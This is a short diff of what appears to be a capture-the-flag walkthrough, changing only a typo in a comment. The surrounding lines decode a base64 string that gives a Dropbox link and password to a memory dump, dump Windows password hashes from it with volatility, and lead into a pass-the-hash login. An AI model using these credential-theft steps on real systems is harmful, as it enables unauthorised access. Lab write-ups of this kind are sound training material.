@@ -60,7 +60,7 @@ $fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
 # Read it on Linx
 echo -n "U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk" | base64 -d
 
-# With this we get access to a dump file. We can extract hashes using volatitility.
+# With this we get access to a dump file. We can extract hashes using volatility.
 volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
 
 # Login with pass the hash
